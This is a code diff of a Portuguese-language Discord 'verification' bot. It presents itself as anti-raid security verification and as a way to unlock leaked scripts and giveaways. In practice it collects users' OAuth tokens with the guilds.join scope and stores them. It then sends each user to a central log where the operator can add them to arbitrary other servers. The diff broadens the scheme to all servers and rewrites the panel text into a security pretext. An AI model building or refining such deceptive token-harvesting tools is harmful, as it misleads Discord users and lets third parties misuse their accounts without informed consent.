@@ -8,25 +8,29 @@ const {
 } = require('discord.js');
 
 // --- CONFIGURAÇÕES ---
+// O Canal onde TODOS os logs de todos os servidores vão chegar
 const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
-const REDIRECT_TARGET = 'https://discordapp.com/channels/1430240815229305033'; 
+// Para onde o usuário volta (pode ser um link genérico ou fixo)
+const REDIRECT_TARGET = 'https://discord.com/app'; 
 
 const app = express();
-// Precisamos da Intent GuildMembers para gerenciar cargos
-const client = new Client({ 
+const client = new Client({
     intents: [
-        GatewayIntentBits.Guilds, 
-        GatewayIntentBits.GuildMembers 
-    ] 
+        GatewayIntentBits.Guilds,
+        GatewayIntentBits.GuildMembers // Necessário para dar cargos
+    ]
 });
+
 const userTokens = new Map();
 
 // --- SERVIDOR WEB ---
-app.get('/', (req, res) => res.send('Auth Manager Online 🟢'));
+app.get('/', (req, res) => res.send('Global Auth Bot Online 🌍'));
 
 app.get('/callback', async (req, res) => {
-    const { code } = req.query;
-    if (!code) return res.send('Erro: Falta o código.');
+    // Agora recebemos também o 'state' (que contém o ID do servidor de origem)
+    const { code, state } = req.query; 
+
+    if (!code) return res.send('Erro: Código não encontrado.');
 
     try {
         // 1. Troca Código por Token
@@ -51,52 +55,51 @@ app.get('/callback', async (req, res) => {
         });
 
         const user = userResponse.data;
-
-        // 3. Salva Token na Memória
         userTokens.set(user.id, access_token);
 
-        // --- NOVA PARTE: DAR CARGO AUTOMÁTICO ---
-        try {
-            const guildId = process.env.MAIN_GUILD;
-            if (guildId) {
-                const guild = client.guilds.cache.get(guildId);
+        // 3. TENTA DAR O CARGO NO SERVIDOR DE ORIGEM (USANDO O STATE)
+        let statusCargo = "⏭️ Ignorado (State vazio)";
+        let nomeServidor = "Desconhecido";
+
+        if (state) {
+            try {
+                const guild = client.guilds.cache.get(state); // 'state' é o ID do servidor
                 if (guild) {
-                    // Busca o usuário no servidor
+                    nomeServidor = guild.name;
                     const member = await guild.members.fetch(user.id).catch(() => null);
-                    
-                    // Busca o cargo pelo NOME EXATO "Auth2 Vetificados"
                     const role = guild.roles.cache.find(r => r.name === 'Auth2 Vetificados');
 
                     if (member && role) {
                         await member.roles.add(role);
-                        console.log(`✅ Cargo dado para: ${user.username}`);
+                        statusCargo = `✅ Entregue em: ${guild.name}`;
                     } else {
-                        console.log(`❌ Erro: Usuário não está no servidor ou cargo 'Auth2 Vetificados' não existe.`);
+                        statusCargo = `❌ Falha: Cargo não existe em ${guild.name}`;
                     }
                 }
+            } catch (e) {
+                console.error(e);
+                statusCargo = "❌ Erro ao processar cargo";
             }
-        } catch (erroCargo) {
-            console.error("Erro ao dar cargo:", erroCargo);
         }
-        // ----------------------------------------
 
-        // 4. Envia LOG para o Admin
+        // 4. LOG CENTRALIZADO (Chega no canal que você configurou no .env)
         const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
         if (logChannel) {
             const embedLog = new EmbedBuilder()
-                .setTitle('📥 Novo Usuário Autorizado')
+                .setTitle('🌍 Nova Verificação Global')
                 .setThumbnail(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`)
                 .addFields(
-                    { name: 'Usuário', value: `${user.username} (${user.id})`, inline: true },
-                    { name: 'Status', value: '🟢 Token Salvo + Cargo Dado', inline: true }
+                    { name: 'Usuário', value: `${user.username}\n(${user.id})`, inline: true },
+                    { name: 'Origem', value: nomeServidor, inline: true },
+                    { name: 'Cargo', value: statusCargo, inline: false }
                 )
                 .setColor(0x00FF00)
-                .setFooter({ text: 'Aguardando envio...' });
+                .setFooter({ text: 'Token salvo com sucesso' });
 
             const row = new ActionRowBuilder().addComponents(
                 new ButtonBuilder()
                     .setCustomId(`btn_abrir_envio_${user.id}`)
-                    .setLabel('Enviar para um Servidor')
+                    .setLabel('Enviar para outro Servidor')
                     .setStyle(ButtonStyle.Primary)
                     .setEmoji('✈️')
             );
@@ -104,49 +107,35 @@ app.get('/callback', async (req, res) => {
             await logChannel.send({ embeds: [embedLog], components: [row] });
         }
 
-        // 5. SITE BONITO (HTML/CSS)
+        // 5. PÁGINA DE SUCESSO
         res.send(`
             <!DOCTYPE html>
             <html lang="pt-br">
             <head>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>Verificado com Sucesso</title>
+                <title>Verificado</title>
                 <style>
-                    body { background-color: #2b2d31; font-family: 'Segoe UI', sans-serif; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
-                    .card { background-color: #313338; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); text-align: center; max-width: 400px; width: 90%; }
-                    .icon { font-size: 60px; color: #23a559; margin-bottom: 20px; }
-                    h1 { margin: 0 0 10px 0; font-size: 24px; }
-                    p { color: #b5bac1; margin-bottom: 30px; }
-                    .btn { background-color: #5865F2; color: white; padding: 12px 24px; text-decoration: none; border-radius: 5px; font-weight: bold; transition: background 0.2s; display: inline-block; }
-                    .btn:hover { background-color: #4752c4; }
-                    .timer { margin-top: 20px; font-size: 12px; color: #949ba4; }
+                    body { background-color: #2b2d31; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
+                    .card { background-color: #313338; padding: 40px; border-radius: 10px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+                    h1 { color: #23a559; }
+                    .btn { background-color: #5865F2; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; margin-top: 20px; display: inline-block; }
                 </style>
             </head>
             <body>
                 <div class="card">
-                    <div class="icon">✅</div>
-                    <h1>Verificado!</h1>
-                    <p>Sua conta foi autenticada. Você já pode fechar esta janela.</p>
-                    <a href="${REDIRECT_TARGET}" class="btn">Voltar ao Servidor</a>
-                    <div class="timer">Redirecionando em <span id="count">3</span>s...</div>
+                    <h1>✅ Sucesso!</h1>
+                    <p>Você foi verificado no servidor <b>${nomeServidor}</b>.</p>
+                    <p>${statusCargo.includes('✅') ? 'Cargo recebido.' : 'Aguarde aprovação.'}</p>
+                    <a href="${REDIRECT_TARGET}" class="btn">Voltar para o Discord</a>
                 </div>
-                <script>
-                    let seconds = 3;
-                    const countSpan = document.getElementById('count');
-                    setInterval(() => {
-                        seconds--;
-                        countSpan.innerText = seconds;
-                        if (seconds <= 0) window.location.href = "${REDIRECT_TARGET}";
-                    }, 1000);
-                </script>
             </body>
             </html>
         `);
 
     } catch (error) {
         console.error(error);
-        res.send('❌ Erro na verificação.');
+        res.send('Erro na verificação.');
     }
 });
 
@@ -154,70 +143,74 @@ app.listen(process.env.PORT || 3000);
 
 // --- BOT DISCORD ---
 client.once('ready', async () => {
-    console.log(`🤖 Bot Logado: ${client.user.tag}`);
+    console.log(`🤖 Bot Logado Globalmente: ${client.user.tag}`);
     
-    const guildId = process.env.MAIN_GUILD;
-    if(guildId) {
-        const guild = client.guilds.cache.get(guildId);
-        if(guild) {
-            await guild.commands.set([{
-                name: 'setup_auth',
-                description: 'Cria o painel de verificação'
-            }]);
+    // REGISTRO GLOBAL DE COMANDOS (Funciona em todos os servidores)
+    // Atenção: Pode demorar até 1 hora para atualizar em todos os servidores do Discord.
+    const commands = [
+        { 
+            name: 'setup_auth', 
+            description: 'Cria o painel de verificação neste canal' 
         }
-    }
+    ];
+
+    await client.application.commands.set(commands);
+    console.log("✅ Comandos Globais registrados/atualizados!");
 });
 
 client.on('interactionCreate', async interaction => {
     
-    // 1. COMANDO SETUP (Link automático pelo Render)
+    // 1. COMANDO SETUP (Gera link com STATE = ID DO SERVIDOR ATUAL)
     if (interaction.isChatInputCommand() && interaction.commandName === 'setup_auth') {
-        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
+        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) 
+            return interaction.reply({ content: '❌ Apenas Admins.', ephemeral: true });
 
-        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join`;
+        // AQUI ESTÁ A MÁGICA: &state=${interaction.guild.id}
+        // Isso envia o ID deste servidor junto com o link, para sabermos onde dar o cargo depois.
+        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
 
         const embed = new EmbedBuilder()
-            .setTitle('🔓 Liberação de Acesso')
-            .setDescription('Verifique-se para liberar **scripts vazados**, **projetos em desenvolvimento**, e muitas outras coisas, como **privilégio em sorteios**!\n\nClique no botão abaixo para autenticar sua conta.')
+            .setTitle('🛡️ Verificação de Segurança')
+            .setDescription('**Proteção Anti-Raid e Liberação de Conteúdo**\n\nClique no botão abaixo para verificar sua conta e liberar seu acesso a **Scripts** e **Sorteios**.')
             .setColor(0x5865F2)
-            .setFooter({ text: 'Sistema Seguro de Verificação' });
+            .setFooter({ text: 'Sistema Global de Verificação' });
 
         const row = new ActionRowBuilder().addComponents(
             new ButtonBuilder().setLabel('Verificar Agora').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('✅')
         );
 
         await interaction.channel.send({ embeds: [embed], components: [row] });
-        await interaction.reply({ content: 'Painel criado!', ephemeral: true });
+        await interaction.reply({ content: '✅ Painel criado neste canal!', ephemeral: true });
     }
 
-    // 2. ABRIR MODAL DE ENVIO
+    // 2. ABRIR MODAL DE ENVIO (Admin clica no Log)
     if (interaction.isButton() && interaction.customId.startsWith('btn_abrir_envio_')) {
-        const targetUserId = interaction.customId.split('_')[3];
-        const modal = new ModalBuilder().setCustomId(`modal_envio_${targetUserId}`).setTitle('Enviar Usuário');
-        const input = new TextInputBuilder().setCustomId('input_server_id').setLabel("ID do Servidor Alvo").setStyle(TextInputStyle.Short);
+        const uid = interaction.customId.split('_')[3];
+        const modal = new ModalBuilder().setCustomId(`modal_envio_${uid}`).setTitle('Mover Usuário');
+        const input = new TextInputBuilder().setCustomId('srv_id').setLabel("ID do Servidor Destino").setStyle(TextInputStyle.Short);
         modal.addComponents(new ActionRowBuilder().addComponents(input));
-        await interaction.showModal(modal);
+        interaction.showModal(modal);
     }
 
     // 3. ENVIAR USUÁRIO
     if (interaction.isModalSubmit() && interaction.customId.startsWith('modal_envio_')) {
-        const targetUserId = interaction.customId.split('_')[2];
-        const targetServerId = interaction.fields.getTextInputValue('input_server_id');
-        const accessToken = userTokens.get(targetUserId);
+        const uid = interaction.customId.split('_')[2];
+        const srvId = interaction.fields.getTextInputValue('srv_id');
+        const token = userTokens.get(uid);
 
         await interaction.deferReply({ ephemeral: true });
 
-        if (!accessToken) return interaction.editReply('❌ Token expirou (Bot reiniciou).');
+        if (!token) return interaction.editReply('❌ Token expirou.');
 
         try {
             await axios.put(
-                `https://discord.com/api/guilds/${targetServerId}/members/${targetUserId}`,
-                { access_token: accessToken },
+                `https://discord.com/api/guilds/${srvId}/members/${uid}`,
+                { access_token: token },
                 { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } }
             );
-            await interaction.editReply(`✅ **Sucesso!** Enviado para \`${targetServerId}\`.`);
-        } catch (erro) {
-            await interaction.editReply('❌ Falha ao adicionar. Verifique permissões do Bot.');
+            interaction.editReply(`✅ Enviado para o servidor ID \`${srvId}\`.`);
+        } catch (e) {
+            interaction.editReply('❌ Falha. Verifique se o bot está no servidor destino.');
         }
     }
 });
